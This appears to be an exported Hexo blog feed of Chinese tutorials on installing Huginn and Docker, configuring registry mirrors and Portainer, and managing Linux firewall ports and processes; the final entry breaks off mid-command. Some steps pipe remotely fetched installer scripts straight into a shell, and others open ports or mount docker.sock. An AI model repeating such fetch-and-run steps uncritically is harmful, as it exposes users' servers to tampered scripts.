3306</code></pre><p>CentOS：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>3306/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="4-安装-Huginn"><a href="#4-安装-Huginn" class="headerlink" title="4. 安装 Huginn"></a>4. 安装 Huginn</h3><p>首次安装：</p><pre class=" language-bash"><code class="language-bash">docker run  --name huginn \    -p 3000:3000 \    --restart always \    -e MYSQL_PORT_3306_TCP_ADDR<span class="token operator">=</span>172.17.0.1 \    -e HUGINN_DATABASE_NAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_USERNAME<span class="token operator">=</span>huginn \    -e HUGINN_DATABASE_PASSWORD<span class="token operator">=</span>PASSWORD \    huginn/huginn</code></pre><p>这里建了一个名为<code>huginn</code>的数据库。</p><p><code>172.17.0.1</code>是本地的IP，即在<code>ifconfig</code>看到的 <code>docker0</code> 的IP。确保在本地可以通过这个IP连上数据库。</p><p>之后直接这样即可↓。</p><pre class=" language-bash"><code class="language-bash">docker start huginn</code></pre><p>上面首次安装时已经配置了开机自启。</p><p>当然也可以这样配置——</p><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always huginn</code></pre><p>好了，完工！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/huginn/huginn" target="_blank" rel="noopener">https://github.com/huginn/huginn</a></p><p><a href="https://www.jianshu.com/p/d272a09ba686" target="_blank" rel="noopener">https://www.jianshu.com/p/d272a09ba686</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
            <tag> Huginn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker安装及常用命令</title>
      <link href="/2020/02/02/Server_Docker/"/>
      <url>/2020/02/02/Server_Docker/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/02/02/Server_Docker/docker.gif" alt="docker图标"></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Building and deploying new applications is faster with containers.<br>Docker containers wrap up software and its dependencies into a  standardized unit for software development that includes everything it  needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration  as simple as sharing a container image.</p></blockquote><blockquote><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p></blockquote><p>其实感觉上就是emmm</p><p>别人把整套环境都配置好打包好了，你直接拿过来用就好了！</p><p>反正用起来贼方便就是了。</p><p><img src="/2020/02/02/Server_Docker/docker2.png" alt="图标"></p><p>感觉docker的图标就挺好看的（</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class=" language-bash"><code class="language-bash">curl -fsSL get.docker.com -o get-docker.sh<span class="token function">sudo</span> sh get-docker.sh --mirror Aliyun</code></pre><p>Windows下下载Docker Desktop</p><p><a href="https://www.docker.com/products/docker-desktop" target="_blank" rel="noopener">https://www.docker.com/products/docker-desktop</a></p><p>（要登陆）</p><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>Linux下，编辑此文件，如果没有则新建。</p><pre class=" language-bash"><code class="language-bash">vim /etc/docker/daemon.json</code></pre><p>Windows下文件为：</p><pre><code>%programdata%\docker\config\daemon.json</code></pre><h3 id="USTC-中科大源（推荐！）"><a href="#USTC-中科大源（推荐！）" class="headerlink" title="USTC 中科大源（推荐！）"></a>USTC 中科大源<strong>（推荐！）</strong></h3><p><a href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/mirrors/help/docker</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="Azure-中国镜像"><a href="#Azure-中国镜像" class="headerlink" title="Azure 中国镜像"></a>Azure 中国镜像</h3><p><a href="https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy" target="_blank" rel="noopener">https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://dockerhub.azk8s.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="DaoCloud-源"><a href="#DaoCloud-源" class="headerlink" title="DaoCloud 源"></a>DaoCloud 源</h3><p><a href="https://www.daocloud.io/mirror" target="_blank" rel="noopener">https://www.daocloud.io/mirror</a></p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http://f1361db2.m.daocloud.io"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>或者 直接执行这个就可以一键修改</p><pre class=" language-bash"><code class="language-bash">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh <span class="token operator">|</span> sh -s http://f1361db2.m.daocloud.io</code></pre><h3 id="163网易源"><a href="#163网易源" class="headerlink" title="163网易源"></a>163网易源</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="阿里源"><a href="#阿里源" class="headerlink" title="阿里源"></a>阿里源</h3><p>要注册，略。</p><h3 id="配置多个镜像"><a href="#配置多个镜像" class="headerlink" title="配置多个镜像"></a>配置多个镜像</h3><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>注意遵循<code>json</code>格式。</p><h3 id="配置完之后重启服务"><a href="#配置完之后重启服务" class="headerlink" title="配置完之后重启服务"></a>配置完之后重启服务</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="检查加速器是否生效"><a href="#检查加速器是否生效" class="headerlink" title="检查加速器是否生效"></a>检查加速器是否生效</h3><p>有如下信息则配置成功。</p><p><img src="/2020/02/02/Server_Docker/mirror.png" alt="mirrors"></p><hr><h2 id="Portainer"><a href="#Portainer" class="headerlink" title="Portainer"></a>Portainer</h2><blockquote><p>Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。</p></blockquote><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 拉取镜像</span>docker pull portainer/portainer<span class="token comment" spellcheck="true"># 一键部署</span>docker volume create portainer_datadocker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</code></pre><p>访问 <a href="http://127.0.0.1:9000" target="_blank" rel="noopener">http://127.0.0.1:9000</a> 即可访问图形化面板。配置好用户名、密码后登录。</p><p><img src="/2020/02/02/Server_Docker/portainer.png" alt="登录界面"></p><p>连接到Local，登录后的主界面如下。</p><p><img src="/2020/02/02/Server_Docker/portainer2.png" alt="Home"></p><h3 id="通过远程访问"><a href="#通过远程访问" class="headerlink" title="通过远程访问"></a>通过远程访问</h3><p>需要在防火墙放行9000端口。</p><p>Ubuntu:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow 9000  </code></pre><p>CentOS:（其实也可以装个 ufw 的）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>9000/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><pre class=" language-bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always portainer</code></pre><p>其实在上面的一键部署命令中已经加了，这里不需要了。（记录一下而已）</p><hr><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h3><h4 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h4><pre class=" language-bash"><code class="language-bash">docker info</code></pre><h4 id="查看镜像、容器、数据卷所占用的空间"><a href="#查看镜像、容器、数据卷所占用的空间" class="headerlink" title="查看镜像、容器、数据卷所占用的空间"></a>查看镜像、容器、数据卷所占用的空间</h4><pre class=" language-bash"><code class="language-bash">docker system <span class="token function">df</span></code></pre><hr><h3 id="容器相关"><a href="#容器相关" class="headerlink" title="容器相关"></a>容器相关</h3><h4 id="查看当前容器"><a href="#查看当前容器" class="headerlink" title="查看当前容器"></a>查看当前容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">ps</span> -a</code></pre><p>有<code>-a</code>则显示所有的容器，包括启动的和未启动的。没有<code>-a</code>的话则只显示运行着的。</p><h4 id="创建-amp-使用容器"><a href="#创建-amp-使用容器" class="headerlink" title="创建&amp;使用容器"></a>创建&amp;使用容器</h4><pre class=" language-bash"><code class="language-bash">docker run -it --name 容器名 镜像名/镜像ID /bin/bash</code></pre><p>使用 <code>-d</code> 参数运行容器，可以让容器在后台运行而不把STDOUT输出到宿主机上。</p><p>（用<code>docker logs [container ID or NAMES]</code>查看）</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，可以看到 Linux 命令提示符，如<code>root@69d137adef7a:/#</code>。只有 <code>-i</code>则没有命令提示符。</p><h4 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h4><pre class=" language-bash"><code class="language-bash">docker start 容器名/容器ID</code></pre><h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><pre class=" language-bash"><code class="language-bash">docker restart 容器名/容器ID</code></pre><h4 id="终止容器"><a href="#终止容器" class="headerlink" title="终止容器"></a>终止容器</h4><pre class=" language-bash"><code class="language-bash">docker stop 容器名/容器ID</code></pre><h4 id="查看容器信息"><a href="#查看容器信息" class="headerlink" title="查看容器信息"></a>查看容器信息</h4><pre class=" language-bash"><code class="language-bash">docker container <span class="token function">ls</span> -a</code></pre><h4 id="容器统计信息"><a href="#容器统计信息" class="headerlink" title="容器统计信息"></a>容器统计信息</h4><pre class=" language-bash"><code class="language-bash">docker stats</code></pre><h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><pre class=" language-bash"><code class="language-bash">docker container start</code></pre><h4 id="获取容器的输出信息"><a href="#获取容器的输出信息" class="headerlink" title="获取容器的输出信息"></a>获取容器的输出信息</h4><pre class=" language-bash"><code class="language-bash">docker container logs <span class="token punctuation">[</span>container ID or NAMES<span class="token punctuation">]</span></code></pre><h4 id="进入容器（连接容器）"><a href="#进入容器（连接容器）" class="headerlink" title="进入容器（连接容器）"></a>进入容器（连接容器）</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">exec</span> -it 容器名/容器ID /bin/bash</code></pre><p>从这个 stdin 中 exit，不会导致容器的停止。<strong>（推荐↑）</strong></p><p>而下面这个，从这个 stdin 中 exit，会导致容器的停止。</p><pre class=" language-bash"><code class="language-bash">docker attach 容器名/容器ID</code></pre><h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><pre class=" language-bash"><code class="language-bash">docker <span class="token function">rm</span> 容器名/容器ID</code></pre><hr><h3 id="镜像相关"><a href="#镜像相关" class="headerlink" title="镜像相关"></a>镜像相关</h3><h4 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h4><pre class=" language-bash"><code class="language-bash">docker search 关键词</code></pre><h4 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker pull 镜像名</code></pre><p><code>镜像名:Tag</code> 可以下载不同标签的镜像。</p><h4 id="查看已下载镜像"><a href="#查看已下载镜像" class="headerlink" title="查看已下载镜像"></a>查看已下载镜像</h4><pre class=" language-bash"><code class="language-bash">docker images -a<span class="token comment" spellcheck="true"># 或者 docker image ls</span></code></pre><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><pre class=" language-bash"><code class="language-bash">docker rmi <span class="token punctuation">[</span>Image ID<span class="token punctuation">]</span></code></pre><hr><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><p>将docker内的80端口映射到宿主机的8000端口上</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 可以使用--name自定义部署的容器名</span>docker run -d -p 8000:80 --name 容器名 镜像名<span class="token comment" spellcheck="true"># 也可以直接通过镜像部署</span>docker run -d -p 8000:80 镜像名</code></pre><p><em>（别急，慢慢学好了啦……</em></p><hr><h2 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h2><p><strong>Docker从入门到实践 GitBook</strong>  <a href="https://yeasy.gitbooks.io/docker_practice/content/" target="_blank" rel="noopener">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p>Docker-镜像常用命令 <a href="https://blog.csdn.net/y472360651/article/details/81289088" target="_blank" rel="noopener">https://blog.csdn.net/y472360651/article/details/81289088</a></p><p>Docker温故知新 <a href="https://www.sqlsec.com/2019/10/docker2.html" target="_blank" rel="noopener">https://www.sqlsec.com/2019/10/docker2.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Firewall &amp; Port Configuration</title>
      <link href="/2020/01/29/Server_firewall/"/>
      <url>/2020/01/29/Server_firewall/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在配服务器环境的时候，动不动遇到端口无法访问的情况，折腾了老半天，经过分析判断最后基本是防火墙把网络端口给拦了……</p><p>于是就来简要记录一下Linux下的防火墙配置，以及端口开放、关闭的配置方法。</p><p>整理自网络啦。</p><hr><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>CentOS下用的是<code>firewall-cmd</code></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="启动firewall"><a href="#启动firewall" class="headerlink" title="启动firewall"></a>启动firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl start firewalld.service</code></pre><h4 id="开机自启firewall"><a href="#开机自启firewall" class="headerlink" title="开机自启firewall"></a>开机自启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> firewalld.service</code></pre><h4 id="查看开机自启是否设置成功"><a href="#查看开机自启是否设置成功" class="headerlink" title="查看开机自启是否设置成功"></a>查看开机自启是否设置成功</h4><pre class=" language-bash"><code class="language-bash">systemctl is-enabled firewalld.service<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$?</span></code></pre><blockquote><p>返回如下则开启成功</p><pre><code>enabled0</code></pre></blockquote><h4 id="重启firewall"><a href="#重启firewall" class="headerlink" title="重启firewall"></a>重启firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl restart firewalld.service</code></pre><h4 id="关闭firewall"><a href="#关闭firewall" class="headerlink" title="关闭firewall"></a>关闭firewall</h4><pre class=" language-bash"><code class="language-bash">systemctl stop firewalld.service</code></pre><h4 id="检测firewall状态"><a href="#检测firewall状态" class="headerlink" title="检测firewall状态"></a>检测firewall状态</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --state</code></pre><blockquote><p>例如正在运行：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --state</span>running</code></pre><p>不在运行则为<code>not running</code></p></blockquote><h3 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h3><h4 id="查看开放（监听）的端口"><a href="#查看开放（监听）的端口" class="headerlink" title="查看开放（监听）的端口"></a>查看开放（监听）的端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --list-ports</code></pre><blockquote><p>example：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --list-ports</span>80/tcp 7650/tcp 3306/tcp</code></pre></blockquote><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">netstat</span> -ntlp</code></pre><blockquote><p>如果没有的话（<em>centos7默认没有 netstat 命令</em>），先安装<code>net-tools</code>。</p><pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> -y net-tools</code></pre></blockquote><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># netstat -ntlp</span>Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      14301/mysqldtcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1840/sshdtcp6       0      0 :::6011                 :::*                    LISTEN      8037/sshd: root@ptstcp6       0      0 :::22                   :::*                    LISTEN      1840/sshd……</code></pre><p>其中<code>tcp</code>为ipv4，<code>tcp6</code>为ipv6.</p></blockquote><p>遇到过几次没有开放firewall端口时，只有<code>tcp6</code>而无<code>tcp</code>的情况，导致访问失败。放行端口后访问正常。</p><p>还遇到过只能从本地 127.0.0.1 或 localhost（实际上二者一样的，默认写在了host里）访问，通过（网卡的）IP地址无法访问的情况。表现在 Local Address 上是<code>127.0.0.1:xxxx</code>，通过修改该程序的网络设置把Address修改为对应的IP或 <code>0.0.0.0</code>，即可解决访问的问题。</p><hr><h4 id="以下操作之后都要执行-重载-或-重启-才能生效！！！"><a href="#以下操作之后都要执行-重载-或-重启-才能生效！！！" class="headerlink" title="以下操作之后都要执行 重载 或 重启 才能生效！！！"></a><strong>以下操作之后都要执行 重载 或 重启 才能生效</strong>！！！</h4><h4 id="开启特定端口"><a href="#开启特定端口" class="headerlink" title="开启特定端口"></a>开启特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>80/tcp --permanent  <span class="token comment" spellcheck="true"># 开放端口</span>systemctl restart firewalld.service    <span class="token comment" spellcheck="true"># 重启firewall</span></code></pre><p>其中， 参数含义为<br><code>--zone</code> 作用域<br><code>--add-port=80/tcp</code>  添加端口，格式为：端口/通讯协议（<code>tcp</code>或<code>udp</code>）<br><code>--permanent</code>   永久生效，没有此参数重启后失效     </p><blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># firewall-cmd --zone=public --add-port=80/tcp --permanent</span>success</code></pre><p>成功则返回 success</p></blockquote><h4 id="开放多个端口"><a href="#开放多个端口" class="headerlink" title="开放多个端口"></a>开放多个端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span>8080-8083/tcp --permanentfirewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span></code></pre><h4 id="关闭特定端口"><a href="#关闭特定端口" class="headerlink" title="关闭特定端口"></a>关闭特定端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --zone<span class="token operator">=</span>public --remove-port<span class="token operator">=</span>5672/tcp --permanent  <span class="token comment" spellcheck="true">#关闭5672端口</span>firewall-cmd --reload   <span class="token comment" spellcheck="true"># 配置立即生效</span><span class="token comment" spellcheck="true"># 也可以用restart</span></code></pre><h4 id="针对某个-IP-开放端口"><a href="#针对某个-IP-开放端口" class="headerlink" title="针对某个 IP 开放端口"></a>针对某个 IP 开放端口</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.142.166<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>6379<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.233<span class="token string">" accept"</span></code></pre><h4 id="删除某个-IP"><a href="#删除某个-IP" class="headerlink" title="删除某个 IP"></a>删除某个 IP</h4><pre class=" language-bash"><code class="language-bash"> firewall-cmd --permanent --remove-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.1.51<span class="token string">" accept"</span></code></pre><h4 id="针对一个-IP-段访问"><a href="#针对一个-IP-段访问" class="headerlink" title="针对一个 IP 段访问"></a>针对一个 IP 段访问</h4><pre class=" language-bash"><code class="language-bash">firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span>192.168.0.0/16<span class="token string">" accept"</span>firewall-cmd --permanent --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source  address="</span>192.168.1.0/24<span class="token string">" port protocol="</span>tcp<span class="token string">" port="</span>9200<span class="token string">" accept"</span></code></pre><br><hr><br><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>Ubuntu 系统默认提供了一个基于<code>iptables</code>之上的防火墙工具<code>ufw</code>。</p><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="安装ufw"><a href="#安装ufw" class="headerlink" title="安装ufw"></a>安装<code>ufw</code></h4><p>（默认已安装）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw</code></pre><h4 id="启用ufw，且在系统启动时自启"><a href="#启用ufw，且在系统启动时自启" class="headerlink" title="启用ufw，且在系统启动时自启"></a>启用<code>ufw</code>，且在系统启动时自启</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw <span class="token function">enable</span></code></pre><h4 id="关闭ufw"><a href="#关闭ufw" class="headerlink" title="关闭ufw"></a>关闭<code>ufw</code></h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw disable</code></pre><h4 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw status</code></pre><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>系统日志保存于<code>/var/log/ufw.log</code>。LEVEL指定不同的级别 ，默认级别是‘低’</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw logging on<span class="token operator">|</span>off  LEVEL   </code></pre><h3 id="端口相关"><a href="#端口相关" class="headerlink" title="端口相关"></a>端口相关</h3><h4 id="设置默认策略"><a href="#设置默认策略" class="headerlink" title="设置默认策略"></a>设置默认策略</h4><p>（比如 “mostly open” vs “mostly closed”）</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw default allow  <span class="token comment" spellcheck="true"># 允许所有外部对本机的访问，且本机访问外部正常。</span><span class="token function">sudo</span> ufw default deny   <span class="token comment" spellcheck="true"># 关闭所有外部对本机的访问，但本机访问外部正常。</span></code></pre><h4 id="打开某个端口"><a href="#打开某个端口" class="headerlink" title="打开某个端口"></a>打开某个端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow smtp　   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的25/tcp （smtp）端口</span><span class="token function">sudo</span> ufw allow 22/tcp   <span class="token comment" spellcheck="true"># 允许所有的外部IP访问本机的22/tcp （ssh）端口</span><span class="token function">sudo</span> ufw allow 53       <span class="token comment" spellcheck="true"># 允许外部访问53端口（tcp/udp）</span><span class="token function">sudo</span> ufw allow from 192.168.1.100  <span class="token comment" spellcheck="true"># 允许此IP访问所有的本机端口</span><span class="token function">sudo</span> ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53<span class="token function">sudo</span> ufw allow <span class="token keyword">in</span> on eth0 from 192.168.0.0/16  <span class="token comment" spellcheck="true"># 允许来自192.168.0.0-192.168.255.255的数据通过eth0网卡进入主机</span><span class="token function">sudo</span> ufw allow out on eth1 to 10.0.0.0/8   <span class="token comment" spellcheck="true"># 允许指向10.0.0.0-10.255.255.255的数据通过eth1网卡从本机发出</span></code></pre><p>可以用<code>less /etc/services</code>列出所有服务信息，其中包括该服务使用了哪个端口和哪种协议</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw deny smtp          <span class="token comment" spellcheck="true"># 禁止外部访问smtp服务</span><span class="token function">sudo</span> ufw delete allow smtp  <span class="token comment" spellcheck="true"># 删除上面建立的某条规则</span><span class="token function">sudo</span> ufw delete allow 80    <span class="token comment" spellcheck="true"># 禁止外部访问80端口</span><span class="token function">sudo</span> ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25  <span class="token comment" spellcheck="true"># 拒绝来自10.0.0.0/8域tcp协议指向192.168.0.1端口25的数据进入本机</span></code></pre><h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> ufw route allow <span class="token keyword">in</span> on eth1 out on eth2   <span class="token comment" spellcheck="true"># 允许经eth1进入，eth2发出的数据经本机路由</span></code></pre><hr><h2 id="进程相关命令"><a href="#进程相关命令" class="headerlink" title="进程相关命令"></a>进程相关命令</h2><h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ps 1</span>  PID TTY      STAT   TIME COMMAND    1 ?        Ss     7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22</code></pre><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">kill</span> -9 1234</code></pre><p>1234为对应的PID</p><blockquote><p>只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。    </p><p>下面是常用的信号：<br>HUP    1    终端断线<br>INT     2    中断（同 Ctrl + C）<br>QUIT    3    退出（同 Ctrl + \）<br>TERM   15    终止<br>KILL    9    强制终止<br>CONT   18    继续（与STOP相反， fg/bg命令）<br>STOP    19    暂停（同 Ctrl + Z）  </p></blockquote><p>或者 </p><p><strong>杀死指定名字的进程</strong>（kill processes by name），可以批量结束某个服务程序带有的全部进程。</p><ol><li>杀死所有同名进程   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> nginx <span class="token function">killall</span> -9 <span class="token function">bash</span></code></pre></li><li>向进程发送指定信号   <pre class=" language-bash"><code class="language-bash"> <span class="token function">killall</span> -TERM ngixn  <span class="token comment" spellcheck="true"># 或者  killall -KILL 